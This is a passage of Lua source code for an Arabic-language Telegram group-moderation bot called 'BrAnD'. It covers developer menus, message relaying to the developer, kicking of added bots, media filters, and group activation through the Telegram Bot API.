DevBrAnD:incr(BrAnD..'BrAnD:MsgNumberDay'..msg.chat_id_..':'..os.date('%d'))  
ChatType = 'sp' 
elseif id:match("^(%d+)") then
if not DevBrAnD:sismember(BrAnD.."BrAnD:Users",msg.chat_id_) then
DevBrAnD:sadd(BrAnD.."BrAnD:Users",msg.chat_id_)
end
ChatType = 'pv' 
else
ChatType = 'gp' 
end
end 
--     SoUrCe BrAnD     --
if ChatType == 'pv' then 
if text == '/start' or text == 'رجوع ،🔙‘' then 
if Sudo(msg) then 
local Sudo_Welcome = '♰ ⌯ مرحبا عزيزي المطور \n♰ ⌯ انت المطور الاساسي هنا \n♰ ⌯ اليك ازرار سورس براند \n♰ ⌯ تستطيع التحكم بكل الاوامر فقط اضغط على الامر الذي تريد تنفيذه'
local key = {
{'وضع اسم البوت','↫ تحديث♰','وضع كليشه المطور'},
{'↫ المطورين♰','↫ الاحصائيات♰'},
{'↫ المجموعات♰','روابط الكروبات','↫ المشتركين♰'},
{'↫ تعطيل التواصل♰','↫ تفعيل التواصل♰'},
{'تنظيف الكروبات','↫ قائمه العام♰','تنظيف المشتركين'},
{'تعطيل ترحيب البوت','تفعيل ترحيب البوت'},
{'↫ تغير معلومات الترحيب♰'},
{'↫ تعطيل المغادره♰','↫ تفعيل المغادره♰'},
{'↫ تعطيل الاذاعه♰','↫ تفعيل الاذاعه♰'},
{'↫ اذاعه بالتثبيت♰'},
{'↫ اذاعه عام♰','↫ اذاعه خاص♰'},
{'↫ اذاعه عام بالتوجيه♰','↫ اذاعه خاص بالتوجيه♰'},
{'~ تعيين كلايش الاوامر ~'},
{'تعطيل البوت الخدمي','تفعيل البوت الخدمي'},
{'جلب نسخه السورس','تحديث السورس','جلب نسخه الكروبات'},
{'↫ حذف رد عام♰','↫ الردود العام♰','↫ اضف رد عام♰'},
{'↫ حذف رد الخاص♰','↫ تعيين رد الخاص♰'},
{'حذف قناة الاشتراك','قناة الاشتراك','تعيين قناة الاشتراك'},
{'حذف كليشه الاشتراك','كليشه الاشتراك','تغير كليشه الاشتراك'},
}
SendInline(msg.chat_id_,Sudo_Welcome,key)
return false
end end
if text == '~ تعيين كلايش الاوامر ~' then 
if Sudo(msg) then 
local Sudo_Welcome = '♰ ⌯ اهلا بك مجددا عزيزي المطور \n♰ ⌯ اليك الازرار الخاصه بتعديل وتغيير كلايش سورس براند فقط اضغط على الامر الذي تريد تنفيذه'
local key = {
{'حذف كليشة الايدي','تعيين كليشة الايدي'},
{'تعيين امر الاوامر'},
{'تعيين امر م3','تعيين امر م2','تعيين امر م1'},
{'تعيين امر م6','تعيين امر م5','تعيين امر م4'},
{'استعادة كلايش الاوامر'},
{'رجوع ،🔙‘'},
}
SendInline(msg.chat_id_,Sudo_Welcome,key)
return false
end end
if text == '/start' then  
if not DevBrAnD:get(BrAnD..'BrAnD:Start:Time'..msg.sender_user_id_) then
tdcli_function({ID="GetUser",user_id_=DevId},function(arg,dp) 
local inline = {{{text="⌁ ︙ المطور ︙♰",url="t.me/"..(dp.username_ or "CXRCX")}}}
local start = DevBrAnD:get(BrAnD.."BrAnD:Start:Bot")
if start then 
Start_SoUrCe = start
else
Start_SoUrCe = "♰ ⌯ مرحبا انا بوت اسمي "..NameBot.."\n♰ ⌯ اختصاصي حماية المجموعات\n♰ ⌯ من التفليش والسبام والخخ .. . ،\n♰ ⌯ تفعيلي سهل ومجانا فقط قم برفعي ادمن في مجموعتك وارسل امر ↫ تفعيل\n♰ ⌯ سيتم رفع الادمنيه والمنشئ تلقائيا"
end 
SendInline(msg.chat_id_,Start_SoUrCe,nil,inline)
end,nil)
end
DevBrAnD:setex(BrAnD..'BrAnD:Start:Time'..msg.sender_user_id_,300,true)
return false
end 
--     SoUrCe BrAnD     --
if not Sudo(msg) and not DevBrAnD:sismember(BrAnD..'BrAnD:Ban:Pv',msg.sender_user_id_) and not DevBrAnD:get(BrAnD..'BrAnD:Texting:Pv') then
tdcli_function({ID="GetUser",user_id_=DevId},function(arg,chat) 
Dev_BrAnD(msg.sender_user_id_, msg.id_, 1, '♰ ⌯ تم ارسال رسالتك الى [المطور](t.me/'..(chat.username_ or "CXRCX")..')', 1, 'md') 
tdcli_function({ID="ForwardMessages",chat_id_=DevId,from_chat_id_= msg.sender_user_id_,message_ids_={[0]=msg.id_},disable_notification_=1,from_background_=1},function(arg,data) 
tdcli_function({ID="GetUser",user_id_=msg.sender_user_id_},function(arg,dp) 
if data and data.messages_ and data.messages_[0] ~= false and data.ID ~= "Error" then
if data and data.messages_ and data.messages_[0].content_.sticker_ then
SendText(DevId,'♰ ⌯ تم ارسال الملصق من ↫ ⤈\n['..string.sub(dp.first_name_,0, 40)..'](tg://user?id='..dp.id_..')',0,'md') 
return false
end;end;end,nil);end,nil);end,nil);end
if Sudo(msg) and msg.reply_to_message_id_ ~= 0  then    
tdcli_function({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)},function(extra, result, success) 
if result.forward_info_.sender_user_id_ then     
id_user = result.forward_info_.sender_user_id_    
end     
tdcli_function ({ID = "GetUser",user_id_ = id_user},function(arg,data) 
if text == 'حظر' or text == 'حضر' then
local Text = '♰ ⌯ العضو ↫ ['..string.sub(data.first_name_,0, 40)..'](tg://user?id='..data.id_..')'..'\n♰ ⌯ تم حظره من التواصل'
SendText(DevId,Text,msg.id_/2097152/0.5,'md') 
DevBrAnD:sadd(BrAnD..'BrAnD:Ban:Pv',data.id_)  
return false  
end 
if text == 'الغاء الحظر' or text == 'الغاء حظر' then
local Text = '♰ ⌯ العضو ↫ ['..string.sub(data.first_name_,0, 40)..'](tg://user?id='..data.id_..')'..'\n♰ ⌯ تم الغاء حظره من التواصل'
SendText(DevId,Text,msg.id_/2097152/0.5,'md') 
DevBrAnD:srem(BrAnD..'BrAnD:Ban:Pv',data.id_)  
return false  
end 
tdcli_function({ID='GetChat',chat_id_ = id_user},function(arg,dataq)
tdcli_function ({ ID = "SendChatAction",chat_id_ = id_user, action_ = {  ID = "SendMessageTypingAction", progress_ = 100} },function(arg,dp) 
if dp.code_ == 400 or dp.code_ == 5 then
Dev_BrAnD(msg.chat_id_, msg.id_, 1, '♰ ⌯ العضو قام بحظر البوت لا تستطيع ارسال الرسائل له', 1, 'md')
return false  
end 
if text then
Dev_BrAnD(id_user, 0, 1, text, 1, "md")  
Text = '♰ ⌯ تم ارسال الرساله الى ↫ ⤈'
elseif msg.content_.ID == 'MessageSticker' then    
sendSticker(id_user, msg.id_, 0, 1,nil, msg.content_.sticker_.sticker_.persistent_id_)   
Text = '♰ ⌯ تم ارسال الملصق الى ↫ ⤈'
elseif msg.content_.ID == 'MessagePhoto' then    
sendPhoto(id_user, msg.id_, 0, 1,nil, msg.content_.photo_.sizes_[0].photo_.persistent_id_,(msg.content_.caption_ or ''))    
Text = '♰ ⌯ تم ارسال الصوره الى ↫ ⤈'
elseif msg.content_.ID == 'MessageAnimation' then    
sendDocument(id_user, msg.id_, 0, 1,nil, msg.content_.animation_.animation_.persistent_id_)    
Text = '♰ ⌯ تم ارسال المتحركه الى ↫ ⤈'
elseif msg.content_.ID == 'MessageVoice' then    
sendVoice(id_user, msg.id_, 0, 1,nil, msg.content_.voice_.voice_.persistent_id_)    
Text = '♰ ⌯ تم ارسال البصمه الى ↫ ⤈'
end     
SendText(DevId, Text..'\n'..'['..string.sub(data.first_name_,0, 40)..'](tg://user?id='..data.id_..')',0,'md') 
end,nil);
end,nil);
end,nil);
end,nil);
end 
end 
--     SoUrCe BrAnD     --
if text and DevBrAnD:get(BrAnD..'BrAnD:Start:Bots') then
if text == 'الغاء' then   
Dev_BrAnD(msg.chat_id_, msg.id_, 1, '♰ ⌯ تم الغاء حفظ كليشة الستارت', 1, 'md')
DevBrAnD:del(BrAnD..'BrAnD:Start:Bots') 
return false
end
DevBrAnD:set(BrAnD.."BrAnD:Start:Bot",text)  
Dev_BrAnD(msg.chat_id_, msg.id_, 1, '♰ ⌯ تم حفظ كليشة الستارت', 1, 'md')
DevBrAnD:del(BrAnD..'BrAnD:Start:Bots') 
return false
end
if Sudo(msg) then
if text == 'تعيين رد الخاص' or text == 'ضع كليشه ستارت' or text == '↫ تعيين رد الخاص♰' then 
DevBrAnD:set(BrAnD..'BrAnD:Start:Bots',true) 
Dev_BrAnD(msg.chat_id_, msg.id_, 1, '♰ ⌯ ارسل لي كليشة الستارت الان', 1, 'md')
return false
end
if text == 'حذف رد الخاص' or text == 'حذف كليشه ستارت' or text == '↫ حذف رد الخاص♰' then 
DevBrAnD:del(BrAnD..'Start:Bot') 
Dev_BrAnD(msg.chat_id_, msg.id_, 1, '♰ ⌯ تم حذف كليشة الستارت بنجاح', 1, 'md')
end
if text == 'جلب رد الخاص' then  
local start = DevBrAnD:get(BrAnD.."BrAnD:Start:Bot")
if start then 
Start_SoUrCe = start
else
Start_SoUrCe = "♰ ⌯ مرحبا انا بوت اسمي "..NameBot.."\n♰ ⌯ اختصاصي حماية المجموعات\n♰ ⌯ من التفليش والسبام والخخ .. . ،\n♰ ⌯ تفعيلي سهل ومجانا فقط قم برفعي ادمن في مجموعتك وارسل امر ↫ تفعيل\n♰ ⌯ سيتم رفع الادمنيه والمنشئ تلقائيا"
end 
Dev_BrAnD(msg.chat_id_, msg.id_, 1, Start_SoUrCe, 1, 'md')
return false
end
if text == 'تفعيل التواصل' or text == '↫ تفعيل التواصل♰' then   
local BrAnDTeAM= '♰ ⌯ اهلا عزيزي ↫ '..BrAnDRank(msg)..' \n♰ ⌯ تم تفعيل التواصل بنجاح'
BrAnDmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, BrAnDTEAM, 14, string.len(msg.sender_user_id_))
DevBrAnD:del(BrAnD..'BrAnD:Texting:Pv') 
end
if text == 'تعطيل التواصل' or text == '↫ تعطيل التواصل♰' then  
local BrAnDTeAM= '♰ ⌯ اهلا عزيزي ↫ '..BrAnDRank(msg)..' \n♰ ⌯ تم تعطيل التواصل بنجاح'
BrAnDmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, BrAnDTEAM, 14, string.len(msg.sender_user_id_))
DevBrAnD:set(BrAnD..'BrAnD:Texting:Pv',true) 
end
end
--     SoUrCe BrAnD     --
function getUser(user_id, cb)
tdcli_function ({
ID = "GetUser",
user_id_ = user_id
}, cb, nil)
end
local msg = data.message_
text = msg.content_.text_
if msg.content_.ID == "MessageChatAddMembers" then 
DevBrAnD:incr(BrAnD..'BrAnD:ContactNumber'..msg.chat_id_..':'..msg.sender_user_id_)
DevBrAnD:set(BrAnD.."Who:Added:Me"..msg.chat_id_..':'..msg.content_.members_[0].id_,msg.sender_user_id_)
local mem_id = msg.content_.members_  
local Bots = DevBrAnD:get(BrAnD.."BrAnD:Lock:Bots"..msg.chat_id_) 
for i=0,#mem_id do  
if msg.content_.members_[i].type_.ID == "UserTypeBot" and Bots == "kick" and not VipMem(msg) then   
https.request("https://api.telegram.org/bot"..TokenBot.."/kickChatMember?chat_id="..msg.chat_id_.."&user_id="..msg.sender_user_id_)
GetInfo = https.request("https://api.telegram.org/bot"..TokenBot.."/kickChatMember?chat_id="..msg.chat_id_.."&user_id="..mem_id[i].id_)
local JsonInfo = JSON.decode(GetInfo)
if JsonInfo.ok == true and #mem_id == i then
local Msgs = {}
Msgs[0] = msg.id_
msgs_id = msg.id_-1048576
for i=1 ,(150) do 
msgs_id = msgs_id+1048576
table.insert(Msgs,msgs_id)
end
tdcli_function ({ID = "GetMessages",chat_id_ = msg.chat_id_,message_ids_ = Msgs},function(arg,data);MsgsDel = {};for i=0 ,data.total_count_ do;if not data.messages_[i] then;if not MsgsDel[0] then;MsgsDel[0] = Msgs[i];end;table.insert(MsgsDel,Msgs[i]);end;end;if MsgsDel[0] then;tdcli_function({ID="DeleteMessages",chat_id_ = arg.chat_id_,message_ids_=MsgsDel},function(arg,data)end,nil);end;end,{chat_id_=msg.chat_id_}) 
tdcli_function({ID = "GetChANnElMembers",ChANnEl_id_ = msg.chat_id_:gsub("-100",""),filter_ = {ID = "ChANnElMembersBots"},offset_ = 0,limit_ = 100 },function(arg,dp) local admins = dp.members_ for i=0 , #admins do if dp.members_[i].status_.ID ~= "ChatMemberStatusEditor" and not VipMem(msg) then tdcli_function ({ID = "ChangeChatMemberStatus",chat_id_ = msg.chat_id_,user_id_ = admins[i].user_id_,status_ = {ID = "ChatMemberStatusKicked"},}, function(arg,f) end, nil) end end end,nil)  
end
end     
end
for i=0,#mem_id do  
if msg.content_.members_[i].type_.ID == "UserTypeBot" and Bots == "del" and not VipMem(msg) then   
GetInfo = https.request("https://api.telegram.org/bot"..TokenBot.."/kickChatMember?chat_id="..msg.chat_id_.."&user_id="..mem_id[i].id_)
local JsonInfo = JSON.decode(GetInfo)
if JsonInfo.ok == true and #mem_id == i then
local Msgs = {}
Msgs[0] = msg.id_
msgs_id = msg.id_-1048576
for i=1 ,(150) do 
msgs_id = msgs_id+1048576
table.insert(Msgs,msgs_id)
end
tdcli_function ({ID = "GetMessages",chat_id_ = msg.chat_id_,message_ids_ = Msgs},function(arg,data);MsgsDel = {};for i=0 ,data.total_count_ do;if not data.messages_[i] then;if not MsgsDel[0] then;MsgsDel[0] = Msgs[i];end;table.insert(MsgsDel,Msgs[i]);end;end;if MsgsDel[0] then;tdcli_function({ID="DeleteMessages",chat_id_ = arg.chat_id_,message_ids_=MsgsDel},function(arg,data)end,nil);end;end,{chat_id_=msg.chat_id_}) 
tdcli_function({ID = "GetChANnElMembers",ChANnEl_id_ = msg.chat_id_:gsub("-100",""),filter_ = {ID = "ChANnElMembersBots"},offset_ = 0,limit_ = 100 },function(arg,dp) local admins = dp.members_ for i=0 , #admins do if dp.members_[i].status_.ID ~= "ChatMemberStatusEditor" and not VipMem(msg) then tdcli_function ({ID = "ChangeChatMemberStatus",chat_id_ = msg.chat_id_,user_id_ = admins[i].user_id_,status_ = {ID = "ChatMemberStatusKicked"},}, function(arg,f) end, nil) end end end,nil)  
end
end     
end
for i=0,#mem_id do  
if msg.content_.members_[i].type_.ID == "UserTypeBot" and Bots == "ked" and not VipMem(msg) then
HTTPS.request("https://api.telegram.org/bot" .. TokenBot .. "/restrictChatMember?chat_id=" .. msg.chat_id_ .. "&user_id=" .. msg.sender_user_id_ .. "&can_send_messages=false&can_send_media_messages=false&can_send_other_messages=false&can_add_web_page_previews=false")
DevBrAnD:sadd(BrAnD..'BrAnD:Tkeed:'..msg.chat_id_, msg.sender_user_id_)
GetInfo = https.request("https://api.telegram.org/bot"..TokenBot.."/kickChatMember?chat_id="..msg.chat_id_.."&user_id="..mem_id[i].id_)
local JsonInfo = JSON.decode(GetInfo)
if JsonInfo.ok == true and #mem_id == i then
local Msgs = {}
Msgs[0] = msg.id_
msgs_id = msg.id_-1048576
for i=1 ,(150) do 
msgs_id = msgs_id+1048576
table.insert(Msgs,msgs_id)
end
tdcli_function ({ID = "GetMessages",chat_id_ = msg.chat_id_,message_ids_ = Msgs},function(arg,data);MsgsDel = {};for i=0 ,data.total_count_ do;if not data.messages_[i] then;if not MsgsDel[0] then;MsgsDel[0] = Msgs[i];end;table.insert(MsgsDel,Msgs[i]);end;end;if MsgsDel[0] then;tdcli_function({ID="DeleteMessages",chat_id_ = arg.chat_id_,message_ids_=MsgsDel},function(arg,data)end,nil);end;end,{chat_id_=msg.chat_id_}) 
tdcli_function({ID = "GetChANnElMembers",ChANnEl_id_ = msg.chat_id_:gsub("-100",""),filter_ = {ID = "ChANnElMembersBots"},offset_ = 0,limit_ = 100 },function(arg,dp) local admins = dp.members_ for i=0 , #admins do if dp.members_[i].status_.ID ~= "ChatMemberStatusEditor" and not VipMem(msg) then tdcli_function ({ID = "ChangeChatMemberStatus",chat_id_ = msg.chat_id_,user_id_ = admins[i].user_id_,status_ = {ID = "ChatMemberStatusKicked"},}, function(arg,f) end, nil) end end end,nil)  
end
end  
end  
end
if msg.content_.ID == "MessageChatDeleteMember" and tonumber(msg.content_.user_.id_) == tonumber(BrAnD) then 
DevBrAnD:srem(BrAnD.."BrAnD:Groups", msg.chat_id_) 
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(extra,result,success)
tdcli_function({ID ="GetChat",chat_id_=msg.chat_id_},function(arg,dp) 
local Name1 = result.first_name_
local Name1 = Name1:gsub('"',"") 
local Name1 = Name1:gsub("'","") 
local Name1 = Name1:gsub("`","") 
local Name1 = Name1:gsub("*","") 
local Name1 = Name1:gsub("{","") 
local Name1 = Name1:gsub("}","") 
local Name = '['..Name1..'](tg://user?id='..result.id_..')'
local NameChat = dp.title_
local NameChat = NameChat:gsub('"',"") 
local NameChat = NameChat:gsub("'","") 
local NameChat = NameChat:gsub("`","") 
local NameChat = NameChat:gsub("*","") 
local NameChat = NameChat:gsub("{","") 
local NameChat = NameChat:gsub("}","") 
SendText(DevId,"♰ ⌯ تم طرد البوت من المجموعه ↫ ⤈ \n⍆═════BR═════⍅\n♰ ⌯ بواسطة ↫ "..Name.."\n♰ ⌯ اسم المجموعه ↫ ["..NameChat.."]\n♰ ⌯ ايدي المجموعه ↫ ⤈ \n❨ `"..msg.chat_id_.."` ❩\n⍆═════BR═════⍅\n♰ ⌯ الوقت ↫ "..os.date("%I:%M%p").."\n♰ ⌯ التاريخ ↫ "..os.date("%Y/%m/%d").."",0,'md')
end,nil)
end,nil)
end
if msg.content_.ID == "MessageChatDeletePhoto" or msg.content_.ID == "MessageChatChangePhoto" or msg.content_.ID == 'MessagePinMessage' or msg.content_.ID == "MessageChatJoinByLink" or msg.content_.ID == "MessageChatAddMembers" or msg.content_.ID == 'MessageChatChangeTitle' or msg.content_.ID == "MessageChatDeleteMember" then   
if DevBrAnD:get(BrAnD..'BrAnD:Lock:TagServr'..msg.chat_id_) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})    
end   
end
if msg.content_.ID == "MessageChatJoinByLink" or msg.content_.ID == "MessageChatAddMembers" then   
DevBrAnD:incr(BrAnD..'BrAnD:EntryNumber'..msg.chat_id_..':'..os.date('%d'))  
elseif msg.content_.ID == "MessageChatDeleteMember" then   
DevBrAnD:incr(BrAnD..'BrAnD:ExitNumber'..msg.chat_id_..':'..os.date('%d'))  
end
--     SoUrCe BrAnD     --
if (data.ID == "UpdateNewMessage") then
local msg = data.message_
local d = data.disable_notification_
local chat = chats[msg.chat_id_]
text = msg.content_.text_ 
--     SoUrCe BrAnD     --
if text ==('تفعيل') and not SudoBot(msg) and SoUrCeCh(msg) then
if not DevBrAnD:get(BrAnD..'BrAnD:Lock:FreeBot'..BrAnD) then
if ChatType == 'pv' then
Dev_BrAnD(msg.chat_id_, msg.id_, 1, '♰ ⌯ لاتستطيع تفعيلي هنا يرجى اضافتي في مجموعه اولا', 1, 'md')
return false
end
if ChatType ~= 'sp' then
Dev_BrAnD(msg.chat_id_, msg.id_, 1, '♰ ⌯ المجموعه عاديه وليست خارقه لا تستطيع تفعيلي يرجى ان تضع سجل رسائل المجموعه ضاهر وليس مخفي ومن بعدها يمكنك رفعي ادمن ثم تفعيلي', 1, 'md')
return false
end
if msg.can_be_deleted_ == false then 
Dev_BrAnD(msg.chat_id_, msg.id_, 1, '♰ ⌯ البوت ليس ادمن يرجى ترقيتي !', 1, 'md')
return false  
end
tdcli_function ({ ID = "GetChANnElFull", ChANnEl_id_ = msg.chat_id_:gsub("-100","")}, function(arg,data)  
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(extra,result,success)
tdcli_function({ID ="GetChat",chat_id_=msg.chat_id_},function(arg,dp) 
tdcli_function ({ID = "GetChatMember",chat_id_ = msg.chat_id_,user_id_ = msg.sender_user_id_},function(arg,ChatMem) 
if ChatMem and ChatMem.status_.ID == "ChatMemberStatusEditor" or ChatMem and ChatMem.status_.ID == "ChatMemberStatusCreator" then
if ChatMem and ChatMem.user_id_ == msg.sender_user_id_ then
if ChatMem.status_.ID == "ChatMemberStatusCreator" then
status = 'منشئ'
elseif ChatMem.status_.ID == "ChatMemberStatusEditor" then
status = 'ادمن'
else 
status = 'عضو'
end
DevBrAnD:del(BrAnD..'BrAnD:BrAnDConstructor:'..msg.chat_id_)
tdcli_function ({ID = "GetChANnElMembers",ChANnEl_id_ = msg.chat_id_:gsub("-100",""),filter_ = {ID = "ChANnElMembersAdministrators"},offset_ = 0,limit_ = 100},function(arg,abbas) 
local admins = abbas.members_
for i=0 , #admins do
if abbas.members_[i].bot_info_ == false and abbas.members_[i].status_.ID == "ChatMemberStatusEditor" then
DevBrAnD:sadd(BrAnD..'BrAnD:Admins:'..msg.chat_id_, admins[i].user_id_)
tdcli_function ({ID = "GetUser",user_id_ = admins[i].user_id_},function(arg,ba) 
if ba.first_name_ == false then
DevBrAnD:srem(BrAnD..'BrAnD:Admins:'..msg.chat_id_, admins[i].user_id_)
end
end,nil)   
else
DevBrAnD:sadd(BrAnD..'BrAnD:Admins:'..msg.chat_id_, admins[i].user_id_)
end
if abbas.members_[i].status_.ID == "ChatMemberStatusCreator" then
DevBrAnD:sadd(BrAnD.."BrAnD:BasicConstructor:"..msg.chat_id_,admins[i].user_id_)
DevBrAnD:sadd(BrAnD.."BrAnD:BrAnDConstructor:"..msg.chat_id_,admins[i].user_id_)
tdcli_function ({ID = "GetUser",user_id_ = admins[i].user_id_},function(arg,ba) 
if ba.first_name_ == false then
DevBrAnD:srem(BrAnD.."BrAnD:BasicConstructor:"..msg.chat_id_,admins[i].user_id_)
DevBrAnD:srem(BrAnD.."BrAnD:BrAnDConstructor:"..msg.chat_id_,admins[i].user_id_)
end
end,nil)  
end 
end
end,nil)
if DevBrAnD:sismember(BrAnD..'BrAnD:Groups',msg.chat_id_) then
Dev_BrAnD(msg.chat_id_, msg.id_, 1, '♰ ⌯ المجموعه بالتاكيد مفعله', 1, 'md')
else
if tonumber(data.member_count_) < tonumber(DevBrAnD:get(BrAnD..'BrAnD:Num:Add:Bot') or 0) and not Sudo(msg) then
Dev_BrAnD(msg.chat_id_, msg.id_, 1, '♰ ⌯ عدد اعضاء المجموعه اقل من ↫ *'..(DevBrAnD:get(BrAnD..'BrAnD:Num:Add:Bot') or 0)..'* عضو', 1, 'md')
return false
end
ReplyStatus(msg,result.id_,"ReplyBy","♰ ⌯ تم تفعيل المجموعه "..dp.title_)  
DevBrAnD:sadd(BrAnD.."BrAnD:Groups",msg.chat_id_)
DevBrAnD:sadd(BrAnD..'BrAnD:BasicConstructor:'..msg.chat_id_,msg.sender_user_id_)
local Name1 = result.first_name_
local Name1 = Name1:gsub('"',"") 
local Name1 = Name1:gsub("'","") 
local Name1 = Name1:gsub("`","") 
local Name1 = Name1:gsub("*","") 
local Name1 = Name1:gsub("{","") 
local Name1 = Name1:gsub("}","") 
local Name = '['..Name1..'](tg://user?id='..result.id_..')'
local NumMem = data.member_count_
local NameChat = dp.title_
local NameChat = NameChat:gsub('"',"") 
local NameChat = NameChat:gsub("'","") 
local NameChat = NameChat:gsub("`","") 
local NameChat = NameChat:gsub("*","") 
local NameChat = NameChat:gsub("{","") 
local NameChat = NameChat:gsub("}","") 
local LinkGp = json:decode(https.request('https://api.telegram.org/bot'..TokenBot..'/exportChatInviteLink?chat_id='..msg.chat_id_))
if LinkGp.ok == true then 
LinkGroup = LinkGp.result
else
LinkGroup = 'لا يوجد'
end
DevBrAnD:set(BrAnD.."BrAnD:Groups:Links"..msg.chat_id_,LinkGroup) 
SendText(DevId,"♰ ⌯ تم تفعيل مجموعه جديده ↫ ⤈ \n⍆═════BR═════⍅\n♰ ⌯ بواسطة ↫ "..Name.."\n♰ ⌯ موقعه في المجموعه ↫ "..status.."\n♰ ⌯ اسم المجموعه ↫ ["..NameChat.."]\n♰ ⌯ عدد اعضاء المجموعه ↫ ❨ *"..NumMem.."* ❩\n♰ ⌯ ايدي المجموعه ↫ ⤈ \n❨ `"..msg.chat_id_.."` ❩\n♰ ⌯ رابط المجموعه ↫ ⤈\n❨ ["..LinkGroup.."] ❩\n⍆═════BR═════⍅\n♰ ⌯ الوقت ↫ "..os.date("%I:%M%p").."\n♰ ⌯ التاريخ ↫ "..os.date("%Y/%m/%d").."",0,'md')
end
end end
end,nil)
end,nil)
end,nil)
end,nil)
else
Dev_BrAnD(msg.chat_id_, msg.id_, 1, '♰ ⌯ لا تستطيع تفعيل هذه المجموعه بسبب تعطيل البوت الخدمي من قبل المطور الاساسي', 1, 'md') 
end 
end 
--     SoUrCe BrAnD     --
if msg.date_ < (os.time() - 30) then
print("*( OLD MESSAGE )*")
return false
end
--     SoUrCe BrAnD     --
tdcli_function({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
if data.username_ ~= false then
DevBrAnD:set(BrAnD..'Save:UserName'..msg.sender_user_id_,data.username_)
end;end,nil) 
--     SoUrCe BrAnD     --
local idf = tostring(msg.chat_id_)
if not DevBrAnD:sismember(BrAnD.."BrAnD:Groups",msg.chat_id_) and not idf:match("^(%d+)") and not SudoBot(msg) then
print("Return False [ Not Enable ]")
return false
end
--     SoUrCe BrAnD     --
-------- MSG TYPES ---------
if msg.content_ then
if msg.reply_markup_ and msg.reply_markup_.ID == "ReplyMarkupInlineKeyboard" then
print("This is [ Inline ]")
msg_type = 'MSG:Inline'
end
--     SoUrCe BrAnD     --
if msg.content_.ID == "MessageText" then
text = msg.content_.text_
print("This is [ Text ]")
msg_type = 'MSG:Text'
end
--     SoUrCe BrAnD     --
if msg.content_.ID == "MessageChatJoinByLink" and not VipMem(msg) then 
if DevBrAnD:get(BrAnD.."BrAnD:Lock:Join"..msg.chat_id_) then
ChatKick(msg.chat_id_,msg.sender_user_id_) 
return false  
end
end
if msg.content_.ID == "MessagePhoto" then
if not Manager(msg) then 
local filter = DevBrAnD:smembers(BrAnD.."BrAnD:FilterPhoto"..msg.chat_id_)
for k,v in pairs(filter) do
if v == msg.content_.photo_.id_ then
tdcli_function({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
if data.username_ ~= false then
Dev_BrAnD(msg.chat_id_, msg.id_, 1, "♰ ⌯ عذرا عزيزي ↫ [@"..data.username_.."]\n♰ ⌯ الصوره التي ارسلتها تم منعها من المجموعه", 1, 'md')
else
Dev_BrAnD(msg.chat_id_, msg.id_, 1, "♰ ⌯ عذرا عزيزي ↫ ["..data.first_name_.."](T.ME/CXRCX)\n♰ ⌯ الصوره التي ارسلتها تم منعها من المجموعه", 1, 'md')
end
end,nil)   
DeleteMessage(msg.chat_id_,{[0] = msg.id_})       
return false   
end
end
end
end
if msg.content_.ID == "MessageAnimation" then
if not Manager(msg) then 
local filter = DevBrAnD:smembers(BrAnD.."BrAnD:FilterAnimation"..msg.chat_id_)
for k,v in pairs(filter) do
if v == msg.content_.animation_.animation_.persistent_id_ then
tdcli_function({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
if data.username_ ~= false then
Dev_BrAnD(msg.chat_id_, msg.id_, 1, "♰ ⌯ عذرا عزيزي ↫ [@"..data.username_.."]\n♰ ⌯ المتحركه التي ارسلتها تم منعها من المجموعه", 1, 'md')
else
Dev_BrAnD(msg.chat_id_, msg.id_, 1, "♰ ⌯ عذرا عزيزي ↫ ["..data.first_name_.."](T.ME/CXRCX)\n♰ ⌯ المتحركه التي ارسلتها تم منعها من المجموعه", 1, 'md')
end
end,nil)   
DeleteMessage(msg.chat_id_,{[0] = msg.id_})       
return false   
end
end
end
end
if msg.content_.ID == "MessageSticker" then
if not Manager(msg) then 
local filter = DevBrAnD:smembers(BrAnD.."BrAnD:FilterSteckr"..msg.chat_id_)
for k,v in pairs(filter) do
if v == msg.content_.sticker_.sticker_.persistent_id_ then
tdcli_function({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
if data.username_ ~= false then
Dev_BrAnD(msg.chat_id_,0, 1, "♰ ⌯ عذرا عزيزي ↫ [@"..data.username_.."]\n♰ ⌯ الملصق الذي ارسلته تم منعه من المجموعه", 1, 'md')
else
Dev_BrAnD(msg.chat_id_,0, 1, "♰ ⌯ عذرا عزيزي ↫ ["..data.first_name_.."](T.ME/CXRCX)\n♰ ⌯ الملصق الذي ارسلته تم منعه من المجموعه", 1, 'md')
end
end,nil)   
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
return false   
end
end
end
end
--     SoUrCe BrAnD     --
if msg.content_.ID == "MessagePhoto" then
print("This is [ Photo ]")
msg_type = 'MSG:Photo'
end
--     SoUrCe BrAnD     --
if msg.content_.ID == "MessageChatAddMembers" then
print("This is [ New User Added ]")
msg_type = 'MSG:NewUserAdd'
end
--     SoUrCe BrAnD     --
if msg.content_.ID == "MessageDocument" then
print("This is [ File Or Document ]")
msg_type = 'MSG:Document'
end
--     SoUrCe BrAnD     --
if msg.content_.ID == "MessageSticker" then
print("This is [ Sticker ]")
msg_type = 'MSG:Sticker'
end
--     SoUrCe BrAnD     --
if msg.content_.ID == "MessageAudio" then
print("This is [ Audio ]")
msg_type = 'MSG:Audio'
end
--     SoUrCe BrAnD     --
if msg.content_.ID == "MessageVoice" then
print("This is [ Voice ]")
msg_type = 'MSG:Voice'
end
--     SoUrCe BrAnD     --
if msg.content_.ID == "MessageVideo" then
print("This is [ Video ]")
msg_type = 'MSG:Video'
end
--     SoUrCe BrAnD     --
if msg.content_.ID == "MessageAnimation" then
print("This is [ Gif ]")
msg_type = 'MSG:Gif'
end
--     SoUrCe BrAnD     --
if msg.content_.ID == "MessageLocation" then
print("This is [ Location ]")
msg_type = 'MSG:Location'
end
--     SoUrCe BrAnD     --
if not msg.reply_markup_ and msg.via_bot_user_id_ ~= 0 then
print("This is [ MarkDown ]")
msg_type = 'MSG:MarkDown'
end
--     SoUrCe BrAnD     --
if msg.content_.ID == "MessageChatJoinByLink" then
print("This is [ Msg Join By Link ]")
